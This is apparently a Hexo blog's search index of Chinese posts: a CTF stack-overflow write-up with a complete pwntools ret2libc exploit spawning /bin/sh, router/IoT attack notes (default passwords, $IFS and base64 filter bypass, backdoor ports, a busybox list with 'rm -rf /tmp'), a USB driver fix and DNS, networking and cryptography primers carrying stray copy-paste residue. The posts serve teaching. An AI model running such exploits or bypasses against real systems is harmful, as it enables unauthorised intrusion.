[{"title":"hello shituku","url":"/2025/04/17/hello-shituku/","content":""},{"title":"Hello World","url":"/2025/04/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"利用栈溢出获取 Shell：从零开始的 PWN 之旅","url":"/2025/04/20/%E5%88%A9%E7%94%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E8%8E%B7%E5%8F%96-Shell%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-PWN-%E4%B9%8B%E6%97%85/","content":"引言在 CTF 竞赛中，PWN（漏洞利用）题目是考验选手逆向分析和漏洞利用能力的重要环节。本文将分析一道简单的 Linux 64 位 PWN 题目，通过栈溢出漏洞构造 ROP 链，最终获取 shell。这篇文章适合 PWN 初学者，旨在展示从逆向分析到利用脚本编写的完整过程。希望通过这篇文章，你能掌握栈溢出的基本原理和利用方法！\n题目背景\n文件：pwnme（64 位 ELF，可执行文件）\n环境：Ubuntu 20.04，关闭 ASLR（echo 0 | sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space）\n保护机制：无 NX、Canary、ASLR、PIE\n目标：通过栈溢出漏洞执行 system(“&#x2F;bin&#x2F;sh”)，获取 shell\n\n题目分析1. 文件检查使用 file 和 checksec 检查文件：\n$ file pwnmepwnme: ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped$ checksec pwnme[*] &#x27;pwnme&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)\n64 位 ELF 文件，动态链接。无 Canary、NX、PIE，栈可执行，地址固定，适合初学者练习栈溢出。Partial RELRO 表示 GOT 表可写，稍后可能利用。\n2. 逆向分析使用 IDA Pro 打开 pwnme，找到 main 函数：\nint main() &#123;    char buf[32];    puts(&quot;Welcome to PWN!&quot;);    printf(&quot;Input your name: &quot;);    gets(buf);    puts(&quot;Hello, &quot;);    puts(buf);    return 0;&#125;\ngets 函数读取用户输入到 buf（大小 32 字节），无长度限制，存在明显的栈溢出漏洞。buf 位于栈上，溢出可以覆盖返回地址，控制程序流程。\n反汇编 main 函数（部分）：\n.text:0000000000401136 main:.text:0000000000401136     push    rbp.text:0000000000401137     mov     rbp, rsp.text:000000000040113A     sub     rsp, 20h.text:000000000040113E     lea     rdi, aWelcomeToPwn ; &quot;Welcome to PWN!&quot;.text:0000000000401145     call    puts.text:000000000040114A     lea     rdi, aInputYourName ; &quot;Input your name: &quot;.text:0000000000401151     call    printf.text:0000000000401156     lea     rax, [rbp-20h].text:000000000040115A     mov     rdi, rax.text:000000000040115D     call    gets....text:0000000000401172     leave.text:0000000000401173     ret\nbuf 位于 [rbp-0x20]，大小 32 字节。溢出可以覆盖 rbp 和返回地址（[rbp+0x8]）。\n3. 漏洞点gets 不检查输入长度，输入超过 32 字节即可覆盖栈上的返回地址。由于 NX 禁用，栈可执行，可以直接写入 shellcode；但为了练习 ROP，我们选择构造 ROP 链调用 system(“&#x2F;bin&#x2F;sh”)。\n利用思路1. 目标通过栈溢出覆盖返回地址，构造 ROP 链调用 system(“&#x2F;bin&#x2F;sh”)，获取 shell。\n2. 关键步骤\n泄露 libc 地址：\nmain 函数调用 puts 和 printf，可以通过 GOT 表泄露 puts 的实际地址，计算 libc 基址。\n使用 ROP 调用 puts(puts@got) 输出 puts 地址。\n\n\n构造 ROP 链：\n找到 pop rdi; ret gadget，将 &#x2F;bin&#x2F;sh 字符串地址放入 rdi。\n调用 system(“&#x2F;bin&#x2F;sh”) 执行 shell。\n\n\n栈布局：\n覆盖返回地址后，栈需要填充 gadget 和参数。\n\n\n\n3. 内存布局栈溢出的内存布局如下：\n[ buf (32 bytes) ][ saved rbp (8 bytes) ][ saved ret (8 bytes) ]                   ^                    ^                   rbp                 rbp+0x8 (覆盖这里)\n输入 32 字节填充 buf，8 字节填充 saved rbp，第 41 字节开始覆盖返回地址。\n利用脚本以下是使用 pwntools 编写的利用脚本：\nfrom pwn import *# 设置环境context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)binary = &#x27;./pwnme&#x27;elf = context.binary = ELF(binary)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)  # 根据环境调整# 启动进程p = process(binary)# 第一次调用：泄露 puts 地址pop_rdi = 0x4011bb  # pop rdi; retprintf_plt = elf.plt[&#x27;printf&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]payload = b&#x27;A&#x27; * 40  # 32 bytes buf + 8 bytes saved rbppayload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendline(payload)p.recvuntil(b&#x27;Hello, \\n&#x27;)# 接收 puts 地址并计算 libc 基址puts_addr = u64(p.recvline().strip().ljust(8, b&#x27;\\x00&#x27;))libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))log.info(f&#x27;puts_addr: &#123;hex(puts_addr)&#125;&#x27;)log.info(f&#x27;libc_base: &#123;hex(libc_base)&#125;&#x27;)log.info(f&#x27;system_addr: &#123;hex(system_addr)&#125;&#x27;)log.info(f&#x27;binsh_addr: &#123;hex(binsh_addr)&#125;&#x27;)# 第二次调用：执行 system(&quot;/bin/sh&quot;)payload = b&#x27;A&#x27; * 40payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)p.sendline(payload)p.recvuntil(b&#x27;Hello, \\n&#x27;)# 进入交互模式p.interactive()\n\n脚本说明\n第一次 payload：\n填充 40 字节覆盖到返回地址。\n调用 puts(puts@got) 泄露 puts 地址。\n返回 main 函数，允许第二次输入。\n\n\n计算 libc 地址：\n从输出中提取 puts 地址，减去 libc 中 puts 的偏移，得到 libc 基址。\n计算 system 和 &#x2F;bin&#x2F;sh 字符串的地址。\n\n\n第二次 payload：\n使用 pop rdi; ret gadget 将 &#x2F;bin&#x2F;sh 地址放入 rdi。\n调用 system 执行 shell。\n\n\n\n运行结果运行脚本后，成功获取 shell：\n$ python3 exploit.py[+] Starting local process &#x27;./pwnme&#x27;: pid 12345[*] puts_addr: 0x7f1234567890[*] libc_base: 0x7f1234500000[*] system_addr: 0x7f1234543210[*] binsh_addr: 0x7f12346789ab[*] Switching to interactive mode$ whoamiuser$ cat flagFLAG&#123;stack_overflow_is_fun&#125;\n成功获取 shell，并读取 Flag。\n调试过程中的“坑”在调试时遇到以下问题：\n\nlibc 版本不匹配：本地 libc 和题目环境的 libc 版本不同，导致偏移错误。解决方法是使用题目提供的 libc 文件或 Docker 环境。\nASLR 未关闭：本地测试时忘记关闭 ASLR，导致地址随机化。使用 echo 0 | sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space 解决。\npayload 长度错误：最初填充长度错误，覆盖了无关区域。使用 gdb 调试确认 buf 到返回地址的偏移为 40 字节。\n\n总结与反思通过这道题目，我学习了以下关键点：\n\n栈溢出原理：通过覆盖返回地址控制程序流程。\nROP 链构造：使用 gadget（如 pop rdi; ret）传递函数参数。\nlibc 地址泄露：利用 GOT 表和 PLT 调用输出动态链接函数的地址。\n\n改进思路\n如果题目启用了 NX，可以尝试 ret2libc 或更复杂的 ROP 链。\n可以优化脚本，使用 pwntools 的 ROP 模块自动构造链。\n未来可以尝试分析带 Canary 或 ASLR 的题目，学习更高级的绕过技术。\n\n"},{"title":"loT基本知识","url":"/2025/04/19/loT%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","content":"前置基础\nmips linux：使用mips指令架构的linux系统，广泛应用于嵌入式系统，路由器常用mips32和arm架构。\nrisc架构：精简指令集，包括mips、arm、risc-v。\nbusybox：精简终端，路由器shell多为裁剪版busybox，shell命令本质为busybox符号链接。\n\n路由的漏洞利用利用方式\n密码破解：默认密码、弱口令、字典爆破、侧信道（如服务器响应时间、返回数据包特征，爆破密码或PIN码）。\nweb漏洞：访问web管理服务与web界面交互，进行渗透（如SQL注入、RCE、CSRF、XSS）。\n后门：如缓冲区溢出、危险函数利用。\n\n密码破解\n默认密码、弱口令、字典爆破。\n侧信道攻击：利用响应时间、数据包特征爆破密码或PIN码。\n\nweb漏洞\nSQL注入、RCE、CSRF、XSS等。\n通过web管理界面进行渗透。\n\n后门\n可绕过安全控制获取访问权的漏洞。\n典型如32764端口后门等。\n\n缓冲区溢出\n危险函数：strcpy、sprintf、snprintf、strchr、gets、fgetc。\nsprintf：格式化字符串中有%s且未判断长度，可能栈溢出。\nsnprintf：返回值为输入长度，size为unsigned类型，需注意负数转大正数的溢出。\nstrchr：复制长度由?前字符串长度决定，需注意越界。\nfgetc：循环读取字符，注意循环边界。\n\n代码示例：\n// 使用snprintf安全格式化字符串，left为已写入长度// Use snprintf to safely format string, left is the length already writtenint left = snprintf(stack, sizeof(stack), &quot;%s&quot;, buf_from_http1);// 继续在stack后面追加内容，防止溢出// Continue appending to stack, prevent overflowsnprintf(stack+left, sizeof(stack)-left, &quot;%s&quot;, buf_from_http2);// 查找url中的&#x27;?&#x27;字符，获取查询参数位置// Find &#x27;?&#x27; in url to get query parameter positionchar *query = strchr(url, &#x27;?&#x27;);// 将url中&#x27;?&#x27;前的内容复制到stack，长度为query - url - 1// Copy content before &#x27;?&#x27; in url to stack, length is query - url - 1strncpy(stack, url, query - url - 1);\n\n逻辑漏洞\n多功能点组合利用，挖掘攻击链。\n\n注入类\n敏感函数：system、popen、exec、execve。\n过滤绕过：如$IFS绕过空格，xxd、base64编码。\n\n工具\nmipsAudit：mips静态汇编审计辅助脚本，回溯敏感函数审计危险函数。\n在IDA-&gt;file-&gt;Script FIle中加载，控制台输出信息并高亮显示。\n\nmips linux\nmips linux广泛用于嵌入式系统，路由器常用mips32和arm。\nmips通过a0-a3传递前4个参数，其余通过栈传递。\n叶子函数与非叶子函数的栈布局和调用方式不同。\n\nbusybox\nbusybox为精简终端，路由器shell多为其裁剪版。\n常用命令：\n\n$ busybox --help        # 查看支持命令 / Show supported commands$ uname -r              # 查看内核版本 / Show kernel version$ ls -al                # 查看详细文件列表 / List files in detail$ rm -rf /tmp           # 强制删除目录 / Force delete directory$ cp -R /tmp ./now      # 复制目录 / Copy directory$ du -sk fireware.bin   # 查看文件大小 / Show file size$ ps -ef                # 查看进程 / Show processes$ kill -9 pid           # 强制终止进程 / Force kill process$ killall -9 xxx        # 强制终止进程名 / Force kill by process name$ ifconfig -a           # 查看所有网卡信息 / Show all network interfaces\n\nHTTP协议\nCRLF：回车换行，C语言为\\r\\n，十六进制0A0D。\nURI：统一资源标识符，包括协议、主机名、端口、路径、查询字符串、片段标识符。\n\n文件系统\n路径作用：\n&#x2F;bin &#x2F;sbin &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;sbin：存放应用程序\n&#x2F;lib &#x2F;usr&#x2F;lib：存放动态库\n&#x2F;etc：存放配置文件\n\n\n\n固件修复\n拿到固件后需模拟环境，缺少硬件易导致仿真失败。\n修复流程：定位异常函数，编写同功能函数并封装为动态库，使用LD_PRELOAD劫持。\n\n路由器漏洞原理与利用路由器web漏洞\nxss、csrf、基础认证漏洞（如http://admin:admin@192.168.0.1形式免输用户名密码）。\n基础认证漏洞可与xss、csrf组合，形成攻击链。\n\n路由器后门漏洞\n可绕过安全控制的漏洞。\n典型如32764端口后门。\n\n路由器溢出漏洞\nmips32函数调用与x86不同，参数传递和栈布局需注意。\n非叶子函数可正常溢出利用，叶子函数需溢出大量数据覆盖父函数返回地址。\n\n软件层分析固件获取\n路由器固件包含操作系统内核和文件系统。\n获取途径：厂商网站、web管理界面、硬件提取、云市场。\n\n文件系统\n路由器文件系统用于存储操作系统、配置文件、日志等。\n常见压缩格式：Squashfs（GZIP, LZMA, LZO, XZ）。\n提取方法：strings、hexdump、dd、file等命令结合使用。\n自动提取工具：binwalk。\n\n代码示例：\n$ strings firmware.bin | grep `python -c &#x27;print &quot;\\x28\\xcd\\x3d\\x45&quot;&#x27;`  # 查找特征字符串 / Find signature string$ dd if=firmware.bin bs=1 count=1024 skip=256 of=out.squashfs             # 提取文件系统 / Extract filesystem$ binwalk -Me x.bin --run-as=root                                         # 自动提取 / Auto extract\n\n硬件层分析\n通过路由器硬件接口获取固件，如JTAG、Flash芯片编程器、芯片夹等。\n路由器flash为常用内存类型，断电后仍保存数据。\nbootloader（如u-boot）负责设备启动和内核加载。\nkernel为操作系统内核，root filesystem为根文件系统。\nnvram保存配置文件，启动时读取。\n\n\n"},{"title":"window电脑usb驱动问题","url":"/2025/04/26/window%E7%94%B5%E8%84%91usb%E9%A9%B1%E5%8A%A8%E9%97%AE%E9%A2%98/","content":"如何你发现你的手机连接不到你的windows电脑，但是你的电脑连接其他手机没问题，而且你手机连接其他电脑没问题，这时候不用怀疑就是连接协议出现了问题！\n问题实例\n已启动设备 USB\\VID_339B&amp;PID_107D\\ANYXVB4119005102。驱动程序名称: oem79.inf类 GUID: &#123;ecfb0cfd-74c4-4f52-bbf7-343461cd72ac&#125;服务: libusbK低层筛选程序: 高层筛选程序: \n\n连接电脑提示的是Service: libusbK 这条信息表明，你的电脑当前并没有将你的手机识别为标准的 MTP (Media Transfer Protocol) 设备，而是使用了一个名为 libusbK 的通用 USB 驱动程序库来与它通信。\n-很好，只是为什么呢？导致这个原因很常见但是我之前还一直没有注意到，打电话给荣耀的工程师也是没有解决（当然不是特意去问的，主要还是因为Magic OS8的重启Bug，吐槽下荣耀的的售后不咋地）之前还一直以为是驱动的问题\n\n\n\n\n\n\n-解决办法就是手动安装驱动程序，核心就是把libusbK给替换掉，化成正确的MTP驱动\n-Scrcpy顺便提下scrcpy（https://github.com/Genymobile/scrcpy?tab=readme-ov-file）一个非常好用的投屏工具\n可以通过USB或者无线局域网让电脑连接到手机\n","tags":["windows"]},{"title":"每周一问 第一期25-3","url":"/2025/05/14/%E6%AF%8F%E5%91%A8%E4%B8%80%E9%97%AE-%E7%AC%AC%E4%B8%80%E6%9C%9F25-3/","content":"大家好，欢迎来到新一期的“每周一问”。本期我们继续探讨一些有趣且基础的技术问题。\n问题一：Web 语言技术的核心是什么？Web 语言的核心就是根据用户的需求提供相应的服务，本质上来说和社会经济学一样。\n出现多种的语言与三个方面有关：\n\n需求：不同的应用场景（如前端交互、后端逻辑、数据处理、人工智能等）催生了对特定功能和性能语言的需求。\n学习难度：语言的设计是否易于上手，语法是否简洁，会影响其流行程度和开发者群体的规模。\n社区：一个活跃的开发者社区能够提供丰富的库、框架、工具和支持，极大地推动语言的发展和应用。\n\n这些语言的区别是：\n1.  特性不同：体现在语言的语法、内置函数、类型系统、并发模型、内存管理方式以及可用的框架和生态系统。这些特性直接影响了语言适合解决的问题域和开发效率。例如，Python 以其简洁易读和丰富的科学计算库著称，而 JavaScript 凭借其在浏览器端的统治地位和 Node.js 的出现，在全栈开发中非常流行。\n2.  设计取舍：在设计语言时，往往需要在不同目标之间做出权衡。例如，是追求极致的运行性能（如 C++, Rust），还是开发效率和易用性（如 Python, Ruby）；是静态类型检查带来的编译期安全（如 Java, Go, TypeScript），还是动态类型的灵活性（如 Python, JavaScript）。这些取舍使得不同语言在特定方面表现突出。\n3.  语言风格与哲学：每种语言背后都有其设计哲学，这影响了其编码风格和社区文化。例如，Python 的“人生苦短，我用Python”（Zen of Python）强调代码的简洁和可读性；Java 的“一次编写，到处运行”（Write Once, Run Anywhere）强调跨平台性。地域文化有时也会间接影响社区的交流方式和特定工具的偏好，但语言本身的风格更多是由其设计者和核心社区塑造的。\n问题二：域名和子域名的关系以及如何管理？（这里就直接引用 AI 的回答，我觉得回答的还行）\n一、域名 (Domain Name) 和子域名 (Subdomain) 的关系想象一个地址系统：\n域名 (Domain Name)：可以看作是你网站或在线服务的主要地址，是你花钱注册的核心标识。例如：example.com。\n它由两部分或更多部分组成，用点 (.) 分隔：\n\n最右边的部分是顶级域名 (TLD - Top-Level Domain)，如 .com, .org, .net, .cn, .io 等。\nTLD 左边的部分是二级域名 (SLD - Second-Level Domain)，这通常是你选择并注册的部分，如 example。\n有时候也会有三级域名，例如在国家代码顶级域名 (ccTLD) 下，如 example.co.uk，这里 .co 是在 .uk 下的二级域。\n\n子域名 (Subdomain)：是主域名下的一个分支或特定区域。它在主域名的左边添加一个或多个标签，并用点 (.) 分隔。子域名可以让你将网站的不同部分或不同服务组织起来，并赋予它们独立的地址。\n例如，对于主域名 example.com，以下是一些子域名：\n\nblog.example.com (可能用于博客)\nshop.example.com (可能用于电商商店)\nsupport.example.com (可能用于支持论坛或文档)\napi.example.com (可能用于应用程序接口)\nmail.example.com (可能用于邮件服务)\n\n甚至可以是多级的子域名，如 staging.admin.example.com。\n核心关系：\n\n层级关系：子域名是主域名的一部分，从属于主域名。你必须先拥有主域名，才能创建其子域名。\n逻辑分区：子域名允许你将一个大的域名空间逻辑地划分为更小、更易于管理的部分。\n独立性 (部分)：虽然子域名从属于主域名，但它们通常可以被配置为指向不同的服务器、托管不同的内容或提供不同的服务，表现得像独立的网站一样（但它们在域名体系中仍然是主域名下的分支）。\n\n二、如何管理域名和子域名域名和子域名的管理主要通过 DNS (Domain Name System) 记录来实现。当你购买了一个域名后，你的域名注册商通常会提供一个DNS管理面板，或者允许你指定使用其他DNS服务商（如 Cloudflare, Amazon Route 53, Google Cloud DNS 等）。\n以下是管理中涉及的关键DNS记录类型：\nA 记录 (Address Record)作用：将一个域名或子域名直接映射到一个 IPv4 地址。\n示例：\nexample.com IN A 192.0.2.1 ; 主域名指向一个IPblog.example.com IN A 198.51.100.5 ; 子域名 blog 指向另一个IP\nAAAA 记录 (IPv6 Address Record)作用：将一个域名或子域名直接映射到一个 IPv6 地址。\n示例：IGNORE_WHEN_COPYING_STARTcontent_copydownloadUse code with caution.IGNORE_WHEN_COPYING_END\nexample.com IN AAAA 2001:db8::1\nCNAME 记录 (Canonical Name Record)作用：将一个域名或子域名作为另一个域名的别名。当用户访问这个子域名时，DNS查询会转向被别名的那个域名，并最终解析到那个域名的IP地址。\n注意：按照标准，主域名 (apex domain &#x2F; root domain，即 example.com 本身) 通常不建议或不允许直接设置CNAME记录（某些现代DNS服务商通过特定技术如CNAME flattening或ALIAS记录绕过此限制），但子域名可以自由使用CNAME。\n示例：IGNORE_WHEN_COPYING_STARTcontent_copydownloadUse code with caution.IGNORE_WHEN_COPYING_END\nwww.example.com IN CNAME example.com ; 将 www 子域名指向主域名shop.example.com IN CNAME some-ecommerce-platform.com ; 将你的商店子域名指向一个SaaS电商平台提供的地址\nMX 记录 (Mail Exchange Record)作用：指定负责处理该域名或子域名电子邮件的邮件服务器。\n示例：IGNORE_WHEN_COPYING_STARTcontent_copydownloadUse code with caution.IGNORE_WHEN_COPYING_END\nexample.com IN MX 10 mail.example.com\n(数字 10 是优先级，数值越小优先级越高)\nTXT 记录 (Text Record)作用：允许你为域名存储任意文本信息。常用于域名所有权验证 (如Google Search Console, SSL证书验证)、SPF (Sender Policy Framework) 防止邮件欺诈、DKIM (DomainKeys Identified Mail) 邮件签名等。\n示例：IGNORE_WHEN_COPYING_STARTcontent_copydownloadUse code with caution.IGNORE_WHEN_COPYING_END\nexample.com IN TXT “v&#x3D;spf1 include:_spf.google.com ~all”\nSRV 记录 (Service Record)作用：指定提供特定服务的主机和端口，常用于VoIP、IM等服务。\n三、子域名与服务器的关系子域名可以通过以下几种方式与服务器关联：\n\n指向不同的独立服务器：\n\n每个子域名（如 blog.example.com 和 shop.example.com）可以分别通过 A 或 AAAA 记录指向不同 IP 地址的独立服务器。\n优点：资源隔离，独立扩展和维护，某个服务的故障不直接影响其他服务。\n缺点：可能需要更多的服务器资源和管理成本。\n\n\n指向同一台服务器，不同端口或虚拟主机：\n\n多个子域名可以都指向同一个 IP 地址（同一台服务器）。\n服务器通过配置（例如 Web 服务器的虚拟主机配置，或不同端口监听不同服务）来区分和处理来自不同子域名的请求。\n优点：成本较低，管理相对集中。\n缺点：所有服务共享服务器资源，高负载时可能相互影响。\n\n\n使用 CNAME 记录指向第三方服务：\n\n例如，help.example.com 可能 CNAME 到一个 SaaS 知识库平台提供的域名，或者 email.example.com CNAME 到专业的邮件服务提供商。\n优点：利用专业的第三方服务，无需自己搭建和维护特定应用。\n缺点：依赖第三方服务的稳定性和安全性，可能涉及额外费用。\n\n\n指向负载均衡器 (Load Balancer)：\n\n子域名（如 app.example.com）通过 A&#x2F;AAAA 记录指向一个负载均衡器的 IP 地址。\n负载均衡器再将流量分发到后端的多台应用服务器。\n优点：提高服务的可用性、可扩展性和性能。\n缺点：架构更复杂，需要配置和维护负载均衡器。\n\n\n\n最终配置取决于你的具体需求、预算和架构设计。DNS 提供了灵活的解析选项，让你能够根据实际情况进行调整。\n问题三：目前的网络中的核心运行原理？我们可以将当今的网络（主要是指互联网）的运行原理概括为基于一套分层协议栈的 数据包交换网络。其核心思想和组件包括：\n1.  分层模型 (Layered Model)：*   最著名的是 **TCP/IP 模型** (通常分为应用层、传输层、网络层、链路层，有时也包括物理层)。OSI 七层模型是理论模型，TCP/IP 是实际应用更广泛的模型。\n*   **分层的好处**：每一层负责特定的功能，上层利用下层提供的服务，而无需关心下层如何实现。这使得网络协议的设计和维护更加模块化和灵活。\n\n2.  数据包交换 (Packet Switching)：*   数据在发送前被分割成许多小的数据包（Packets）。\n*   每个数据包都包含头部信息（如源地址、目标地址、序列号等）和实际数据。\n*   这些数据包可以独立地通过网络的不同路径进行传输，并在目标端重新组装。\n*   **优点**：高效利用网络带宽，鲁棒性强（部分路径故障不影响整体）。\n\n3.  IP 协议 (Internet Protocol)：*   工作在网络层，负责将数据包从源主机传送到目标主机。\n*   它定义了 **IP 地址**，为网络中的每个设备提供唯一的逻辑标识 (如 IPv4, IPv6)。\n*   IP 协议是 **无连接的** (Connectionless) 和 **不可靠的** (Unreliable)，它只尽力投递数据包，不保证数据包的顺序、不丢失或不损坏。\n\n4.  路由 (Routing)：*   网络中的 **路由器 (Routers)** 根据数据包的目标 IP 地址和自身的路由表来决定下一跳将数据包发送到哪里。\n*   路由协议 (如 BGP, OSPF) 用于在路由器之间交换路由信息，构建和维护路由表，确保数据包能够找到通往目的地的最佳路径。\n\n5.  TCP 协议 (Transmission Control Protocol) 和 UDP 协议 (User Datagram Protocol)：*   工作在传输层，为应用程序提供端到端的通信服务。\n*   **TCP**：提供 **面向连接的、可靠的** 数据传输。它通过序列号、确认应答 (ACK)、重传机制、流量控制和拥塞控制来保证数据完整、有序地到达。适用于对可靠性要求高的应用，如网页浏览 (HTTP/HTTPS)、文件传输 (FTP)、邮件 (SMTP)。\n*   **UDP**：提供 **无连接的、不可靠的** 数据传输。它开销小，传输速度快，但不保证数据到达、顺序或完整性。适用于对实时性要求高、能容忍少量丢包的应用，如在线游戏、视频会议、DNS 查询。\n\n6.  域名系统 (DNS - Domain Name System)：*   如问题二所述，DNS 负责将人类易于记忆的域名 (如 `www.example.com`) 解析为机器可识别的 IP 地址。这是用户访问互联网服务的第一步。\n\n7.  应用层协议 (Application Layer Protocols)：*   基于 TCP 或 UDP，定义了特定应用程序之间数据交换的格式和规则。\n*   例如：HTTP/HTTPS (网页)、FTP (文件传输)、SMTP (邮件发送)、POP3/IMAP (邮件接收)、DNS (域名解析) 等。\n\n简单来说，当你在浏览器输入一个网址并回车后：\n\nDNS 解析将域名转换为 IP 地址。\n你的计算机（客户端）与目标服务器通过 TCP 建立连接（三次握手）。\n浏览器通过 HTTP&#x2F;HTTPS 协议向服务器发送请求报文（被封装成 TCP 段，再封装成 IP 包，再封装成链路层帧）。\n这些数据包通过本地网络、路由器，跨越互联网，到达目标服务器。\n服务器处理请求，并将响应数据（如 HTML 页面）以同样的方式打包发送回你的计算机。\n浏览器接收数据包，重新组装，渲染页面。\n通信结束后，TCP 连接关闭（四次挥手）。\n\n这个过程涉及了各层协议的协同工作，构成了现代互联网的核心运作机制。\n问题四：密码学 如何安全的管理数据？密码学是保护信息和通信安全的一门科学和艺术，它提供了一系列技术和方法来确保数据的 机密性 (Confidentiality)、完整性 (Integrity)、真实性&#x2F;身份验证 (Authenticity&#x2F;Authentication) 以及 不可否认性 (Non-repudiation)。安全管理数据主要依赖以下密码学核心技术：\n1.  加密 (Encryption) - 保护机密性：*   **对称加密 (Symmetric Encryption)**：\n    *   **原理**: 加密和解密使用相同的密钥。发送方用密钥加密数据，接收方用同一密钥解密数据。\n    *   **算法示例**: AES (Advanced Encryption Standard), DES, 3DES, ChaCha20。\n    *   **优点**: 计算速度快，适合大量数据的加密。\n    *   **缺点**: 密钥分发和管理是主要挑战，如何在不安全的信道上安全地共享密钥是个问题。\n    *   **应用**: 磁盘加密、数据库加密、SSL/TLS 中的会话数据加密。\n*   **非对称加密 (Asymmetric Encryption) / 公钥密码体制**:\n    *   **原理**: 使用一对密钥：公钥 (Public Key) 和私钥 (Private Key)。公钥可以公开分发，私钥由所有者秘密保管。用公钥加密的数据只能用对应的私钥解密；用私钥签名的数据可以用公钥验证。\n    *   **算法示例**: RSA, ECC (Elliptic Curve Cryptography), Diffie-Hellman (密钥交换)。\n    *   **优点**: 解决了对称加密的密钥分发问题。公钥可以自由分发。\n    *   **缺点**: 计算速度相对较慢，不适合加密大量数据。\n    *   **应用**: SSL/TLS 中的密钥交换和身份验证、数字签名、安全电子邮件 (PGP/GPG)。\n\n2.  哈希函数 (Hash Functions) - 保护完整性：*   **原理**: 将任意长度的输入数据通过一个单向函数转换为固定长度的输出（哈希值或摘要）。\n*   **特性**:\n    *   **单向性**: 从哈希值很难反推出原始数据。\n    *   **确定性**: 相同的输入总是产生相同的输出。\n    *   **抗碰撞性**: 很难找到两个不同的输入产生相同的哈希值（强抗碰撞性）；或者很难找到一个与给定输入具有相同哈希值的不同输入（弱抗碰撞性）。\n    *   **雪崩效应**: 输入的微小改变会导致输出哈希值的巨大变化。\n*   **算法示例**: SHA-256, SHA-3, MD5 (已不安全，不推荐用于安全性要求高的场景), Blake2。\n*   **应用**:\n    *   验证数据完整性（如下载文件后对比哈希值）。\n    *   安全存储密码（存储密码的哈希值，而不是明文密码，通常会加盐 &quot;salt&quot;）。\n    *   数字签名（对数据的哈希值进行签名）。\n    *   区块链。\n\n3.  数字签名 (Digital Signatures) - 保护真实性、完整性、不可否认性：*   **原理**: 结合了非对称加密和哈希函数。\n    1.  发送方对数据进行哈希运算得到摘要。\n    2.  发送方用自己的 **私钥** 对摘要进行加密，生成数字签名。\n    3.  发送方将原始数据和数字签名一起发送给接收方。\n    4.  接收方收到数据和签名后：\n        a. 用发送方的 **公钥** 解密数字签名，得到原始摘要A。\n        b. 对收到的原始数据进行同样的哈希运算，得到摘要B。\n        c. 比较摘要A和摘要B，如果一致，则数据未被篡改（完整性），且确实来自拥有该私钥的发送方（真实性），发送方不能否认发送过该消息（不可否认性）。\n*   **应用**: 软件分发（验证软件来源和完整性）、代码签名、法律文件、SSL/TLS 证书。\n\n4.  密钥管理 (Key Management)：*   这是密码学应用中最关键也最困难的部分。即使加密算法本身再强大，如果密钥泄露或管理不当，整个安全体系也会崩溃。\n*   **关键方面**:\n    *   **密钥生成**: 安全地生成足够强度的随机密钥。\n    *   **密钥存储**: 安全地存储密钥，防止未授权访问（如使用硬件安全模块 HSM、密钥管理系统 KMS）。\n    *   **密钥分发/交换**: 安全地将密钥传递给授权方（如 Diffie-Hellman 密钥交换协议，或使用非对称加密分发对称密钥）。\n    *   **密钥使用**: 控制密钥的使用范围和权限。\n    *   **密钥轮换/更新**: 定期更换密钥，以减少密钥泄露的潜在影响。\n    *   **密钥销毁/吊销**: 安全地销毁不再需要的密钥，或在密钥泄露时吊销其有效性（如证书吊销列表 CRL）。\n\n5.  协议 (Protocols)：*   将上述密码学技术组合起来，形成安全的通信和数据处理协议。\n*   **示例**: TLS/SSL (安全套接层/传输层安全) 用于保护网络通信，它综合使用了对称加密、非对称加密、哈希函数和数字证书（包含公钥和身份信息，由证书颁发机构 CA 签名）来实现服务器认证、客户端认证（可选）、数据加密和完整性保护。\n\n总结一下安全管理数据的策略：\n\n数据加密: 对静态数据（存储的数据）和动态数据（传输中的数据）进行加密。\n完整性校验: 使用哈希函数确保数据在存储或传输过程中未被篡改。\n身份验证: 通过数字签名或消息认证码 (MAC) 验证数据来源和通信方身份。\n密钥管理: 实施严格的密钥管理策略和基础设施。\n访问控制: 确保只有授权用户才能访问敏感数据和密钥。\n安全协议: 使用成熟的、经过审查的安全协议。\n\n通过综合运用这些密码学工具和原则，可以大大提高数据管理的安全性。\n\nIGNORE_WHEN_COPYING_STARTcontent_copydownloadUse code with caution.IGNORE_WHEN_COPYING_END\n","tags":["每周一问"]}]